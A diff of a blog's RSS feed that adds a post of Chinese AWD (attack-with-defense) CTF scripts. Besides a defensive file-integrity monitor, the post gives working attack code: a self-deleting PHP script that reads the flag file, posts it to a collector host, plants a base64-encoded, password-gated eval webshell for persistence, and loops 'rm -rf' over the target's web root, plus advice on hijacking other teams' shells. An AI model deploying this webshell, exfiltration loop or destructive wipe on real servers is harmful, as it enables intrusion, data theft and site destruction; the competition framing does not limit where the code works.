@@ -10,10 +10,238 @@
         </author>
         <description>刻意练习</description>
         <language>en</language>
-        <pubDate>Wed, 15 Dec 2021 15:02:24 +0800</pubDate>
-        <lastBuildDate>Wed, 15 Dec 2021 15:02:24 +0800</lastBuildDate>
+        <pubDate>Mon, 20 Dec 2021 10:44:24 +0800</pubDate>
+        <lastBuildDate>Mon, 20 Dec 2021 10:44:24 +0800</lastBuildDate>
         <category term="关键词1" />
         <category term="关键词2" />
+        <item>
+            <guid isPermalink="true">https://zephyr-cyber.github.io.git/AWD/</guid>
+            <title>AWD脚本</title>
+            <link>https://zephyr-cyber.github.io.git/AWD/</link>
+            <category term="computer-science" scheme="https://zephyr-cyber.github.io.git/categories/computer-science/" />
+            <category term="CTF" scheme="https://zephyr-cyber.github.io.git/tags/CTF/" />
+            <pubDate>Mon, 20 Dec 2021 10:44:24 +0800</pubDate>
+            <description><![CDATA[ &lt;ol&gt;
+&lt;li&gt;给的是ctf低权限账号，但是中间件运行的是www-data权限，通常比ctf权限高，有些马用ssh上去删不掉，可以先传个自己的shell然后去删，当然得做一个防止被偷家的措施，比如说加一个if (‘xxx’===md5(key))的操作。也可以用www-data去对文件和目录做权限的修改等操作。&lt;/li&gt;
+&lt;li&gt;黑吃黑，直接用别的队伍上传的shell。&lt;/li&gt;
+&lt;li&gt;不是特别大型的比赛没有那么多的时间去审漏洞，通常用nday直接打，或者内置的shell后门。&lt;/li&gt;
+&lt;li&gt;批量拿flag并自动提交平台；自动备份与恢复自己的靶机文件。网上找的确实不会用&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h1 id=&#34;AWD线下赛防守脚本：&#34;&gt;&lt;a href=&#34;#AWD线下赛防守脚本：&#34; class=&#34;headerlink&#34; title=&#34;AWD线下赛防守脚本：&#34;&gt;&lt;/a&gt;AWD线下赛防守脚本：&lt;/h1&gt;&lt;p&gt;1.该脚本基于python，可直接在linux靶机上运行。&lt;/p&gt;
+&lt;p&gt;2.开局直接运行起来，会自动对web目录进行备份，并建立hash索引。当web目录下有文件被删除或者被篡改的时候，会自动从备份中恢复文件。如果存在其他文件上传，会自动删除。&lt;/p&gt;
+&lt;p&gt;3.无法避免的缺点：由于条件竞争，如果对方在我们删除shell之前就已经在内存中开始生成不死马了，还是有一定几率沦陷。&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;python&#34;&gt;-*- coding: utf-8 -*-#
+awd文件监控脚本
+
+import os
+import json
+import time
+import hashlib
+
+
+
+
+def ListDir(path): # 获取网站所有文件
+
+for file in os.listdir(path):
+file_path = os.path.join(path, file)
+if os.path.isdir(file_path):
+if initialization[&amp;#39;ok&amp;#39;] == &amp;#39;false&amp;#39;:
+dir_list.append(file_path)
+else:
+dir_list_tmp.append(file_path)
+ListDir(file_path)
+else:
+if initialization[&amp;#39;ok&amp;#39;] == &amp;#39;false&amp;#39;:
+file_list.append(file_path)
+else:
+file_list_tmp.append(file_path)
+
+
+def GetHash(): # 获取hash，建立索引
+for bak in file_list:
+with open(bak, &amp;#39;rb&amp;#39;) as f:
+md5obj = hashlib.md5()
+md5obj.update(f.read())
+hash = md5obj.hexdigest()
+bak_dict[bak] = hash
+if os.path.exists(&amp;#39;/tmp/awd_web_hash.txt&amp;#39;) == False:
+os.system(&amp;#39;mkdir /tmp/awd_web_bak/&amp;#39;)
+os.system(&amp;#39;\\cp -a &amp;#123;0&amp;#125;* /tmp/awd_web_bak/&amp;#39;.format(web_dir))
+with open(&amp;#39;/tmp/awd_web_hash.txt&amp;#39;, &amp;#39;w&amp;#39;) as f: # 记录web文件hash
+f.write(str(json.dumps(bak_dict)))
+for i in file_list: # 记录web文件列表
+with open(&amp;#39;/tmp/awd_web_list.txt&amp;#39;, &amp;#39;a&amp;#39;) as f:
+f.write(i &amp;#39;\n&amp;#39;)
+for i in dir_list: # 记录web目录列表
+with open(&amp;#39;/tmp/awd_web_dir.txt&amp;#39;, &amp;#39;a&amp;#39;) as f:
+f.write(i &amp;#39;\n&amp;#39;)
+
+
+def FileMonitor(): # 文件监控
+
+# 提取当前web目录状态
+
+initialization[&amp;#39;ok&amp;#39;] = &amp;#39;true&amp;#39;
+for file in os.listdir(web_dir):
+file_path = os.path.join(web_dir, file)
+if os.path.isdir(file_path):
+dir_list_tmp.append(file_path)
+ListDir(file_path)
+else:
+file_list_tmp.append(file_path)
+for file in file_list_tmp:
+with open(file, &amp;#39;rb&amp;#39;) as f:
+md5obj = hashlib.md5()
+md5obj.update(f.read())
+hash = md5obj.hexdigest()
+bak_dict_tmp[file] = hash
+with open(&amp;#39;/tmp/awd_web_hash.txt&amp;#39;, &amp;#39;r&amp;#39;) as f: # 读取备份的文件hash
+real_bak_dict = json.loads(f.read())
+with open(&amp;#39;/tmp/awd_web_list.txt&amp;#39;, &amp;#39;r&amp;#39;) as f: # 读取备份的文件列表
+real_file_list = f.read().split(&amp;#39;\n&amp;#39;)[0:-1]
+with open(&amp;#39;/tmp/awd_web_dir.txt&amp;#39;, &amp;#39;r&amp;#39;) as f: # 读取备份的目录列表
+real_dir_list = f.read().split(&amp;#39;\n&amp;#39;)[0:-1]
+
+for dir in real_dir_list: # 恢复web目录
+try:
+os.makedirs(dir)
+print(&amp;#39;[del-recover]dir:&amp;#123;&amp;#125;&amp;#39;.format(dir))
+except:
+pass
+
+for file in file_list_tmp:
+try:
+if real_bak_dict[file] != bak_dict_tmp[file]: # 检测被篡改的文件，自动恢复
+os.system(&amp;#39;\\cp &amp;#123;0&amp;#125; &amp;#123;1&amp;#125;&amp;#39;.format(file.replace(web_dir, &amp;#39;/tmp/awd_web_bak/&amp;#39;), file))
+print(&amp;#39;[modify-recover]file:&amp;#123;&amp;#125;&amp;#39;.format(file))
+except: # 检测新增的文件，自动删除
+os.system(&amp;#39;rm -rf &amp;#123;0&amp;#125;&amp;#39;.format(file))
+print(&amp;#39;[delete]webshell:&amp;#123;0&amp;#125;&amp;#39;.format(file))
+
+for real_file in real_file_list: # 检测被删除的文件，自动恢复
+if real_file not in file_list_tmp:
+os.system(&amp;#39;\\cp &amp;#123;0&amp;#125; &amp;#123;1&amp;#125;&amp;#39;.format(real_file.replace(web_dir, &amp;#39;/tmp/awd_web_bak/&amp;#39;), real_file))
+print(&amp;#39;[del-recover]file:&amp;#123;0&amp;#125;&amp;#39;.format(real_file))
+file_list_tmp[:] = []
+dir_list_tmp[:] = []
+
+
+os.system(&amp;#39;rm -rf /tmp/awd_web_hash.txt /tmp/awd_web_list.txt /tmp/awd_web_dir.txt /tmp/awd_web_bak/&amp;#39;)
+web_dir = &amp;#39;/var/www/&amp;#39; # web目录，注意最后要加斜杠
+file_list = []
+dir_list = []
+bak_dict = &amp;#123;&amp;#125;
+file_list_tmp = []
+dir_list_tmp = []
+bak_dict_tmp = &amp;#123;&amp;#125;
+initialization = &amp;#123;&amp;#39;ok&amp;#39;: &amp;#39;false&amp;#39;&amp;#125;
+ListDir(web_dir)
+GetHash()
+while True:
+print(time.ctime() &amp;#39; 安全&amp;#39;)
+FileMonitor()
+time.sleep(1) # 监控间隔，按需修改
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h1 id=&#34;AWD线下赛攻击脚本：&#34;&gt;&lt;a href=&#34;#AWD线下赛攻击脚本：&#34; class=&#34;headerlink&#34; title=&#34;AWD线下赛攻击脚本：&#34;&gt;&lt;/a&gt;AWD线下赛攻击脚本：&lt;/h1&gt;&lt;p&gt;（1）内存马&amp;amp;自动获取刷新的flag&lt;/p&gt;
+&lt;p&gt;该脚本功能：&lt;/p&gt;
+&lt;p&gt;1.该脚本为内存脚本，访问一下就自删除，不留痕迹。&lt;/p&gt;
+&lt;p&gt;2.自动读取flag，并将flag提交到指定地址，会自动检测是否更新flag，只有更新了flag才会提交，需要在脚本中修改flag物理路径。&lt;/p&gt;
+&lt;p&gt;3.会生成不死马，不死马具有隐藏和欺骗功能。用蚁剑访问&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3h4eC8uYzQwM2Q1OWZlYTMzMTEzZGY0NGQ0NjVhZWVjMzM2YWIucGhwP2tleT1zc3IyMDIxc2h1b3NodXJlbm1kNSVFRiVCQyU4QyVFNSVBRiU4NiVFNyVBMCU4MSVFNCVCOCVCQWElRTMlODAlODI=&#34;&gt;http://xxx/.c403d59fea33113df44d465aeec336ab.php?key=ssr2021shuoshurenmd5，密码为a。&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;木马原始代码如下（只要别人不知道key，就没办法黑吃黑）：&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;&amp;lt;?php $key=$_GET[&amp;#39;key&amp;#39;];$keyhash=md5($key);if($keyhash===&amp;#39;c403d59fea33113df44d465aeec336ab&amp;#39;) &amp;#123;    eval($_POST[&amp;#39;a&amp;#39;]);&amp;#125;echo&amp;#39;file not find.&amp;#39;;?&amp;gt;&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;这个只作为备用连接，flag正常自己提交过来的话就不用管。&lt;/p&gt;
+&lt;p&gt;4.该脚本会不断删除目标的网站源码，别人扣分等于我们加分。&lt;/p&gt;
+&lt;p&gt;5.脚本命名必须为awd2021.php，若要修改的话需要同步修改下面代码中的文件名。&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;python&#34;&gt;&amp;lt;?php
+function send_post($url, $post_data) &amp;#123;
+$postdata = http_build_query($post_data);
+$options = array(
+&amp;#39;http&amp;#39; =&amp;gt; array(
+&amp;#39;method&amp;#39; =&amp;gt; &amp;#39;POST&amp;#39;,
+&amp;#39;header&amp;#39; =&amp;gt; &amp;#39;Content-type:application/x-www-form-urlencoded&amp;#39;,
+&amp;#39;content&amp;#39; =&amp;gt; $postdata,
+&amp;#39;timeout&amp;#39; =&amp;gt; 15 * 60
+)
+);
+$context = stream_context_create($options);
+$result = file_get_contents($url, false, $context);
+return $result;
+&amp;#125;
+$flag_tmp=&amp;#39;flag&amp;#123;xxx&amp;#125;&amp;#39;;
+@unlink (&amp;#39;awd2021.php&amp;#39;);
+while (True) &amp;#123;
+$flag=system(&amp;#39;cat flag.txt&amp;#39;);
+$data=array(
+&amp;#39;flag&amp;#39; =&amp;gt; $flag
+);
+if ($flag!=$flag_tmp) &amp;#123;
+send_post(&amp;#39;http://127.0.0.1/getflag.php&amp;#39;, $data);
+&amp;#125;
+$flag_tmp=$flag;
+$shell=base64_decode(&amp;#39;PD9waHAgJGtleT0kX0dFVFsia2V5Il07CiRrZXloYXNoPW1kNSgka2V5KTsKaWYoJGtleWhhc2g9PT0iYzQwM2Q1OWZlYTMzMTEzZGY0NGQ0NjVhZWVjMzM2YWIiKSB7CglldmFsKCRfUE9TVFsiYSJdKTsKfQplY2hvImZpbGUgbm90IGZpbmQuIjsKPz4=&amp;#39;);
+if (file_exists(&amp;#39;.c403d59fea33113df44d465aeec336ab.php&amp;#39;)==0) &amp;#123;
+file_put_contents(&amp;#39;.c403d59fea33113df44d465aeec336ab.php&amp;#39;, $shell, FILE_APPEND);
+&amp;#125;
+system(&amp;#39;rm -rf /var/www/html/* !(.c403d59fea33113df44d465aeec336ab.php)&amp;#39;);
+&amp;#125;
+?&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;（2）服务端接收flag&lt;/p&gt;
+&lt;p&gt;1.按照往年比赛经验，靶机和我们的电脑是互通的，这个脚本可以本机开一个phpstudy跑起来，若不通的话直接放自己的靶机服务器上。&lt;/p&gt;
+&lt;p&gt;2.这个脚本默认名字为getflag.php，如果修改的话需要修改内存脚本中对应的文件名。&lt;/p&gt;
+&lt;p&gt;3.新的flag会源源不断提交过来，在当前目录的shuoshuren_flag.txt里面。&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;&amp;lt;?php$flag=$_POST[&amp;#39;flag&amp;#39;];file_put_contents(&amp;#39;shuoshuren_flag.txt&amp;#39;, $flag.&amp;#39;\n&amp;#39;, FILE_APPEND);?&amp;gt;&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;（3）自动提交flag脚本&lt;/p&gt;
+&lt;p&gt;根据往年经验，flag提交平台是有验证码的，所以这个脚本调用了验证码训练识别模型，达到自动化提交flag的目的，平台没有验证码的话就不用识别。&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;python&#34;&gt;# base python3
+import requests
+import base64
+import json
+import time
+
+
+def GetPic(url): # 获取验证码并识别，这里会调用我本机的验证码训练识别模型（refer：算命瞎子）
+pic_content=requests.get(url).content
+pic_base64=base64.b64encode(pic_content).decode()
+data=&amp;#39;base64=&amp;#39; pic_base64
+try:
+yzm=requests.post(&amp;#39;http://192.168.3.103:8899/base64&amp;#39;,data=data).text
+return yzm
+except:
+return &amp;#39;yzm&amp;#39;
+
+def PostFlag(PostUrl,PicUrl,flag): # 提交flag
+with open(flag,&amp;#39;r&amp;#39;) as f:
+flag_list=f.read().split(&amp;#39;\n&amp;#39;)
+headers=&amp;#123;
+#请求头需要现场抓包
+&amp;#125;
+for flag in flag_list:
+if flag in flag_list:
+print(&amp;#39;&amp;#123;&amp;#125; 重复&amp;#39;.format(flag))
+else:
+GetYzm=GetPic(PicUrl)
+data = json.dumps(&amp;#123;&amp;#39;请求体需要现场抓包，字典格式&amp;#39;&amp;#125;)
+try:
+res=requests.post(url=PostUrl,headers=headers,data=data)
+if &amp;#39;成功的标识符&amp;#39; in res.text:
+print(&amp;#39;&amp;#123;&amp;#125; 提交成功&amp;#39;.format(flag))
+flag_list_ok.append(flag)
+else:
+print(&amp;#39;&amp;#123;&amp;#125; 提交失败&amp;#39;.format(flag))
+except:
+print(&amp;#39;其他错误&amp;#39;)
+
+flag_list_ok=[]
+while True:#
+PostFlag(&amp;#39;提交flag的请求地址&amp;#39;,&amp;#39;flag平台验证码的地址&amp;#39;,&amp;#39;shuoshuren_flag.txt&amp;#39;)
+time.sleep(300)#休息5分钟，可以按需修改
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;来自&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3d3dy4zNjBkb2MuY29tL2NvbnRlbnQvMjEvMDYyMS8xNC83MTkzOTY2Ml85ODMwMjM2Mjguc2h0bWw=&#34;&gt;http://www.360doc.com/content/21/0621/14/71939662_983023628.shtml&lt;/span&gt;&lt;/p&gt;
+ ]]></description>
+        </item>
         <item>
             <guid isPermalink="true">https://zephyr-cyber.github.io.git/MiniLCTF_2020%E9%A2%98%E8%A7%A3/</guid>
             <title>MiniLCTF_2020题解</title>
@@ -1780,18 +2008,6 @@ This line is only separated by a single newline, so it&#39;s a separate line in 
 alt=&amp;quot;IMAGE ALT TEXT HERE&amp;quot; width=&amp;quot;240&amp;quot; height=&amp;quot;180&amp;quot; border=&amp;quot;10&amp;quot; /&amp;gt;&amp;lt;/a&amp;gt;&lt;/p&gt;
 &lt;p&gt;Pure markdown version:&lt;/p&gt;
 &lt;p&gt;&lt;a href=&#34;https://www.youtube.com/watch?v=ARted4RniaU&#34;&gt;&lt;img data-src=&#34;https://img.youtube.com/vi/ARted4RniaU/0.jpg&#34; alt=&#34;IMAGE ALT TEXT HERE&#34; /&gt;&lt;/a&gt;&lt;/p&gt;
- ]]></description>
-        </item>
-        <item>
-            <guid isPermalink="true">https://zephyr-cyber.github.io.git/images/</guid>
-            <title>Images</title>
-            <link>https://zephyr-cyber.github.io.git/images/</link>
-            <pubDate>Thu, 26 Dec 2013 22:46:49 +0800</pubDate>
-            <description><![CDATA[ &lt;p&gt;This is a image test post.&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;/assets/wallpaper-2572384.jpg&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;/assets/wallpaper-2311325.jpg&#34; alt=&#34;Caption&#34; /&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;/assets/wallpaper-878514.jpg&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://placehold.it/350x150.jpg&#34; alt=&#34;Small Picture&#34; /&gt;&lt;/p&gt;
  ]]></description>
         </item>
     </channel>
